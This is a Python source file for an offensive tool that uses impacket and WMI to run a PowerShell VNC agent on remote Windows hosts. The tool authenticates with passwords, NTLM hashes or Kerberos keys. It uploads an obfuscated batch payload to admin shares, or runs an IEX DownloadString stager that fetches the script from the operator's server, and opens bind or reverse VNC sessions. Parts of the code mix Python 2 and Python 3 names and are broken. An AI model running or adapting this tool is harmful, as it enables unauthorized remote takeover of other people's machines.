#!/usr/bin/env python
#
# Execute powershell VNC agent (Invoke-Vnc.ps1) via WMI
# Supports uploading via SMB or downloading via HTTP  
#
# Author:
#  Artem Kondratenko (@artkond)
#
# Based on https://github.com/CoreSecurity/impacket/examples/
# Kudos to @asolino
#
#
#!/usr/bin/python

import zlib
import base64
import os.path
import os
import sys
from io import StringIO
import time
import logging
import argparse
import cmd
import ntpath
import uuid
import string
import http.server
import socketserver
import threading
import tempfile

from impacket.examples import logger
from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport, srvs


class PSOneliner:
    blob = 'powershell.exe -NoP -NonI -E "{}"'
    ps1_comment_decoder_stage = "sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('{}'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"

    def __init__(self, script_contents, launch_string=None):    
        powershell_script = script_contents
        if launch_string is not None:
            powershell_script += '\r\n' + launch_string

        stage = PSOneliner.ps1_comment_decoder_stage.format(PSOneliner.deflate_and_base64_encode(powershell_script))
        self.encoded_buffer = PSOneliner.blob.format(PSOneliner.generate_b64_oneliner(stage)) 
        return

    @staticmethod
    def deflate_and_base64_encode(string_val):
        zlibbed_str = zlib.compress( string_val )
        compressed_string = zlibbed_str[2:-4]
        return base64.b64encode( compressed_string )

    @staticmethod    
    def generate_b64_oneliner(ps1_buf):
        return base64.b64encode(ps1_buf.encode('utf-16')[2:])

    def __str__(self):
        return self.encoded_buffer


class BatEncode:
    ps1_comment_decoder_stage1 = "$file = Get-Content '{}'\r\nforeach ($line in $file)\r\n{{\r\n    if ($line.Substring(0,3) -eq 'rem')\r\n    {{\r\n        $result = $result + $line.Substring(4)\r\n    }}    \r\n}}\r\nsal a New-Object \r\niex (a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($result),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()\r\nexit"
    ps1_comment_decoder_stage2 = "sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('{}'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
    end_blob = 'IF EXIST %SystemRoot%\\sysnative\WindowsPowerShell\\v1.0\\ (set "ps=%SystemRoot%\\sysnative\\WindowsPowerShell\\v1.0\\")\r\nIF NOT EXIST %SystemRoot%\\sysnative\\WindowsPowerShell\\v1.0\\ (set "ps=")\r\n%ps%powershell.exe -NoP -NonI -E "{}"'
    bat_str_len = 2005

    @staticmethod
    def deflate_and_base64_encode(string_val):
        zlibbed_str = zlib.compress(string_val)
        compressed_string = zlibbed_str[2:-4]
        return base64.b64encode( compressed_string )

    @staticmethod
    def gen_comment_block(ps1_buf):
        n = BatEncode.bat_str_len
        lines = [ps1_buf[i:i+n] for i in range(0, len(ps1_buf), n)] 
        res = '@echo off\r\n'
        for line in lines:
            res += 'rem ' + line + '\r\n'
        return res

    @staticmethod
    def generate_b64_oneliner(ps1_buf):
        return base64.b64encode(ps1_buf.encode('utf-16')[2:])

    def __init__(self, script_contents, target_filepath, launch_string=None):     
        encoded_stage1 = BatEncode.ps1_comment_decoder_stage1.format(target_filepath)
        encoded_stage2 = BatEncode.ps1_comment_decoder_stage2.format(BatEncode.deflate_and_base64_encode(encoded_stage1))
        encoded_enb_blob = BatEncode.end_blob.format(BatEncode.generate_b64_oneliner(encoded_stage2))
        powershell_script = script_contents

        if launch_string is not None:
            powershell_script += '\r\n' + launch_string

        res = BatEncode.gen_comment_block(BatEncode.deflate_and_base64_encode(powershell_script)) + encoded_enb_blob

        self.encoded_buffer = res
        return

    def get_buffer(self):
        return self.encoded_buffer


class VNCEXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, share=None, doKerberos=False, kdcHost=None):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__share = share
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.shell = None
        self.vnc_upload_path = None
        self.vnc_upload_filename = None
        self.full_file_path = None
        self.smbConnection = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')


    def findWritableShare(self, shares):
        # Check we can write a file on the shares, stop in the first one
        for i in shares['Buffer']:
            if i['shi1_type'] == srvs.STYPE_DISKTREE or i['shi1_type'] == srvs.STYPE_SPECIAL:
               share = i['shi1_netname'][:-1]
               if (len(share) == 2 and share[1] == '$') or share == 'ADMIN$':
                 pass
               else:
                 logging.info('Bad share %s' % share)
                 continue
               try:
                   self.smbConnection.createDirectory(share,'ARTKOND')
               except:
                   # Can't create, pass
                   #import traceback
                   #print traceback.print_exc()
                   logging.critical("share '%s' is not writable." % share)
                   pass
               else:
                   logging.info('Found writable share %s' % share)
                   self.smbConnection.deleteDirectory(share,'ARTKOND')
                   return str(share)
        return None

    def getShares(self):
        # Setup up a DCE SMBTransport with the connection already in place
        logging.info("Requesting shares on %s....." % (self.smbConnection.getRemoteHost()))
        try: 
            self._rpctransport = transport.SMBTransport(self.smbConnection.getRemoteHost(), self.smbConnection.getRemoteHost(),filename = r'\srvsvc', smb_connection = self.smbConnection)
            dce_srvs = self._rpctransport.get_dce_rpc()
            dce_srvs.connect()

            dce_srvs.bind(srvs.MSRPC_UUID_SRVS)
            resp = srvs.hNetrShareEnum(dce_srvs, 1)
            return resp['InfoStruct']['ShareInfo']['Level1']
        except:
            logging.critical("Error requesting shares on %s, aborting....." % (self.smbConnection.getRemoteHost()))
            raise

    def get_vnc_upload_path(self, share):
        if share == 'ADMIN$':
            return "C:\\windows\\temp\\"
        if len(share) == 2:
            if share[1] == '$':
                return share[0] + ":\\"

    def copy_file(self, file, tree, dst):

        logging.info("Uploading " + self.vnc_upload_path + self.vnc_upload_filename)
        
        pathname = string.replace(dst,'/','\\')
        try:
            self.smbConnection.putFile(tree, pathname, file.read)
        except:
            logging.critical("Error uploading file %s, aborting....." % dst)
            raise

    def upload_vnc(self, addr, bc_ip, contype, vncpass, vncport, invoke_vnc_path):  
            fileCopied = False
            serviceCreated = False
            # Do the stuff here
            try:
                # Let's get the shares
                if self.__share is None:
                    shares = self.getShares()
                    self.__share = self.findWritableShare(shares)


                if self.__share is None:
                    logging.critical("Couldn't find writable share")
                    raise

                self.vnc_upload_path = self.get_vnc_upload_path(self.__share)

                if self.vnc_upload_path is None:
                    logging.critical("Can't deduct local path from share name " + self.__share)
                    raise

                self.vnc_upload_filename = uuid.uuid4().hex[:8] + '.bat'

                encoded_bat = BatEncode(open(invoke_vnc_path, 'rb').read(), self.vnc_upload_path + self.vnc_upload_filename, self.launch_string)
                encoded_buffer = encoded_bat.get_buffer()
                mem_file = StringIO.StringIO(encoded_buffer)


                if self.__share == 'ADMIN$':
                    self.full_file_path = '\\TEMP\\' + self.vnc_upload_filename
                else:
                    self.full_file_path = '\\' + self.vnc_upload_filename

                self.copy_file(mem_file , self.__share, self.full_file_path)
                fileCopied = True
            except:
                raise

    def run(self, addr, method, bc_ip, contype, vncpass, vncport, invoke_vnc_path, httpport):
        if bc_ip is None:
            bc_ip = ''

        self.launch_string = 'Invoke-Vnc '
        if contype == 'bind':
            pass
        elif contype == 'reverse':
            if bc_ip is None:
                print('Ip addr required for reverse connection')
                sys.exit(1)
            else:
                self.launch_string += '-IpAddress ' + bc_ip 

        self.launch_string += ' -ConType ' + contype +' -Port ' + vncport  + ' -Password ' + vncpass
        logging.info("Using powershell launch string '" + self.launch_string + "'")

        if method == 'upload':
            logging.info("Connecting to SMB at " + addr)
            self.smbConnection = SMBConnection(addr, addr)
            if self.__doKerberos is False:
                self.smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                self.smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                            self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)


            dialect = self.smbConnection.getDialect()
            if dialect == SMB_DIALECT:
                logging.info("SMBv1 dialect used")
            elif dialect == SMB2_DIALECT_002:
                logging.info("SMBv2.0 dialect used")
            elif dialect == SMB2_DIALECT_21:
                logging.info("SMBv2.1 dialect used")
            else:
                logging.info("SMBv3.0 dialect used")


            self.upload_vnc(addr, bc_ip, contype, vncpass, vncport, invoke_vnc_path)


            dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                  self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
            try:
                iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
                iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
                iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
                iWbemLevel1Login.RemRelease()

                win32Process,_ = iWbemServices.GetObject('Win32_Process')

                self.shell = RemoteShell(self.__share, win32Process, None)
                logging.info("Executing " + self.vnc_upload_path + self.vnc_upload_filename)
                if contype == 'bind':
                    logging.info("VNC server should start at {0}:{1}".format(addr, vncport))
                else:
                    logging.info("Expect reverse VNC connection at port " + vncport)
                self.shell.onecmd(self.vnc_upload_path + self.vnc_upload_filename)
                logging.info("Sleeping 10 seconds to allow bat file to unpack itself before deleting it")
                time.sleep(10)
                self.smbConnection.deleteFile(self.__share, self.full_file_path)
                logging.info("File " + self.__share + self.full_file_path + " deleted")
            except  (Exception, KeyboardInterrupt) as e:
                #import traceback
                #traceback.print_exc()
                logging.error(str(e))
                logging.info("Error on executing bat file. Trying to delete it before exiting")
                self.smbConnection.deleteFile(self.__share, self.full_file_path)
                logging.info("{0} deleted".format(self.__share + self.full_file_path))
                if self.smbConnection is not None:
                    self.smbConnection.logoff()
                dcom.disconnect()
                sys.stdout.flush()
                sys.exit(1)

            if self.smbConnection is not None:
                self.smbConnection.logoff()
            dcom.disconnect()

        elif method == 'download':
            if bc_ip == '':
                logging.critical("-bc-ip needed when using download delivery method")
                sys.exit(1)

            ps1_line = "IEX (New-Object System.Net.Webclient).DownloadString('http://{0}:{1}/Invoke-Vnc.ps1'); {2}".format(bc_ip, httpport, self.launch_string)
            logging.info("Stager: {0}".format(ps1_line))
            command = str(PSOneliner(ps1_line))
            logging.debug(command)
            dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                  self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
            try:
                iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
                iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
                iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
                iWbemLevel1Login.RemRelease()

                win32Process,_ = iWbemServices.GetObject('Win32_Process')

                self.shell = RemoteShell(None, win32Process, None)
                self.shell.onecmd(command)
                while True:
                    pass
                dcom.disconnect()
            except (Exception, KeyboardInterrupt) as e:
                #import traceback
                #traceback.print_exc()
                logging.error(str(e))
                logging.critical("Closing DCOM connection")
                dcom.disconnect()
                sys.stdout.flush()
                raise



class RemoteShell(cmd.Cmd):
    def __init__(self, share, win32Process, smbConnection):
        cmd.Cmd.__init__(self)
        self.__share = share
        #self.__output = '\\' + OUTPUT_FILENAME 
        self.__outputBuffer = ''
        self.__shell = 'cmd.exe /Q /c '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__pwd = 'C:\\'
        self.__noOutput = False
        self.intro = '[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands'

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(100000)
            self.do_cd('\\')
        else:
            self.__noOutput = True

    def do_shell(self, s):
        os.system(s)

    def do_help(self, line):
        print("""
 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 put {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
 get {file}                 - downloads pathname to the current local dir 
 ! {cmd}                    - executes a local shell cmd
""") 

    def do_lcd(self, s):
        if s == '':
            print(os.getcwd())
        else:
            try:
                os.chdir(s)
            except Exception as e:
                logging.error(str(e))

    def do_get(self, src_path):
        try:
            import ntpath
            newPath = ntpath.normpath(ntpath.join(self.__pwd, src_path))
            drive, tail = ntpath.splitdrive(newPath) 
            filename = ntpath.basename(tail)
            fh = open(filename,'wb')
            logging.info("Downloading %s\\%s" % (drive, tail))
            self.__transferClient.getFile(drive[:-1]+'$', tail, fh.write)
            fh.close()
        except Exception as e:
            logging.error(str(e))
            os.remove(filename)
            pass

    def do_put(self, s):
        try:
            params = s.split(' ')
            if len(params) > 1:
                src_path = params[0]
                dst_path = params[1]
            elif len(params) == 1:
                src_path = params[0]
                dst_path = ''

            src_file = os.path.basename(src_path)
            fh = open(src_path, 'rb')
            dst_path = string.replace(dst_path, '/','\\')
            import ntpath
            pathname = ntpath.join(ntpath.join(self.__pwd,dst_path), src_file)
            drive, tail = ntpath.splitdrive(pathname)
            logging.info("Uploading %s to %s" % (src_file, pathname))
            self.__transferClient.putFile(drive[:-1]+'$', tail, fh.read)
            fh.close()
        except Exception as e:
            logging.critical(str(e))
            pass

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = ''
        else:
            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.prompt = self.__pwd + '>'
            self.__outputBuffer = ''

    def default(self, line):
        # Let's try to guess if the user is trying to change drive
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0: 
                # Something went wrong
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                # Drive valid, now we should get the current path
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = self.__pwd + '>'
                self.__outputBuffer = ''
        else:
            if line != '':
                self.send_data(line)

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    # Output not finished, let's wait
                    time.sleep(1)
                    pass
                elif str(e).find('Broken') >= 0:
                    # The SMB Connection might have timed out, let's try reconnecting
                    logging.debug('Connection broken, trying to recreate it')
                    self.__transferClient.reconnect()
                    return self.get_output()
        self.__transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data):
        command = self.__shell + data 
        if self.__noOutput is False:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'
        self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        #print self.__outputBuffer
        self.__outputBuffer = ''

class AuthFileSyntaxError(Exception):
    
    '''raised by load_smbclient_auth_file if it encounters a syntax error
    while loading the smbclient-style authentication file.'''

    def __init__(self, path, lineno, reason):
        self.path=path
        self.lineno=lineno
        self.reason=reason
    
    def __str__(self):
        return 'Syntax error in auth file %s line %d: %s' % (
            self.path, self.lineno, self.reason )

def load_smbclient_auth_file(path):

    '''Load credentials from an smbclient-style authentication file (used by
    smbclient, mount.cifs and others).  returns (domain, username, password)
    or raises AuthFileSyntaxError or any I/O exceptions.'''

    lineno=0
    domain=None
    username=None
    password=None
    for line in open(path):
        lineno+=1

        line = line.strip()

        if line.startswith('#') or line=='':
            continue
            
        parts = line.split('=',1)
        if len(parts) != 2:
            raise AuthFileSyntaxError(path, lineno, 'No "=" present in line')
        
        (k,v) = (parts[0].strip(), parts[1].strip())
        
        if k=='username':
            username=v
        elif k=='password':
            password=v
        elif k=='domain':
            domain=v
        else:
            raise AuthFileSyntaxError(path, lineno, 'Unknown option %s' % repr(k))
            
    return (domain, username, password)




def delete_temp_file(dirname, filename):
        if os.path.exists(dirname):
            if os.path.exists(filename):
                os.unlink(filename)
            os.rmdir(dirname)


def main():
    tempdir = None
    logger.init()

    parser = argparse.ArgumentParser(add_help = True, description = "Inject VNC agent into active console session. Payload is delivered via SMB or HTTP.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-share', action='store', default = None, help='share where vnc batch file will be upload '
                                                                           '(default - check for available writable shares )')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    vnc_group = parser.add_argument_group('vnc')
    vnc_group.add_argument('-invoke-vnc-path', dest='invoke_vnc_path', default='Invoke-Vnc.ps1', action='store', help="Invoke-Vnc.ps1 filepath")
    vnc_group.add_argument('-bc-ip', dest='bc_ip', required=False, action='store', help="IP with reverse VNC handler")
    vnc_group.add_argument('-contype', dest='contype', required=True, action='store', help="Connection type. Either bind or reverse")
    vnc_group.add_argument('-vncport', dest='vncport', required=True, action='store', help="Port for reverse/bind VNC connection")
    vnc_group.add_argument('-vncpass', dest='vncpass', required=True, action='store', help="VNC password")
    vnc_group.add_argument('-method', dest='method', required=False, default='upload', action='store', help="Payload delivery method. Either 'upload' or 'download'")
    vnc_group.add_argument('-httpport', dest='httpport', required=False, default='80', action='store', help="HTTP server port to download payload from")

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-A', action="store", metavar = "authfile", help="smbclient/mount.cifs-style authentication file. ")


    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
    options = parser.parse_args()

    
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    import re

    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        options.target).groups('')

    #In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    try:
        if options.A is not None:
            (domain, username, password) = load_smbclient_auth_file(options.A)
            logging.debug('loaded smbclient auth file: domain=%s, username=%s, password=%s' % (repr(domain), repr(username), repr(password)))
        
        if domain is None:
            domain = ''

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass
            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

        if options.method == 'download':
            SocketServer.TCPServer.allow_reuse_address = True
            PORT = int(options.httpport)
            tempdir = tempfile.mkdtemp()

            logging.debug('Powershell script path: {0}'.format(options.invoke_vnc_path))
            with open(tempdir + "/Invoke-Vnc.ps1", 'wb') as f:
                f.write(open(options.invoke_vnc_path, 'rb').read())
                f.close()
            os.chdir(tempdir)
            Handler = SimpleHTTPServer.SimpleHTTPRequestHandler

            httpd = SocketServer.TCPServer(("", PORT), Handler)


            logging.info("Serving payload at HTTP port " + str(PORT))
            httpthread = threading.Thread(target=httpd.serve_forever)
            httpthread.daemon = True
            httpthread.start()
        elif options.method == 'upload':
            pass
        else:
            logging.critical("Unknown delivery method specified")
            sys.exit(1)


        executer = VNCEXEC(username, password, domain, options.hashes, options.aesKey,
                           options.share, options.k, options.dc_ip)
        executer.run(address, options.method, options.bc_ip, options.contype, options.vncpass, options.vncport, options.invoke_vnc_path, options.httpport)


    except (Exception, KeyboardInterrupt) as e:
        #import traceback
        #print traceback.print_exc()
        logging.error(str(e))
        os.unlink(tempdir + '/' + 'Invoke-Vnc.ps1')
        os.rmdir(tempdir)
        if options.method=='download' and tempdir is not None:
            delete_temp_file(tempdir, tempdir + '/' + 'Invoke-Vnc.ps1')


    if options.method=='download' and tempdir is not None:
            delete_temp_file(tempdir, tempdir + '/' + 'Invoke-Vnc.ps1')
    sys.exit(0)



if __name__ == '__main__':
    main()
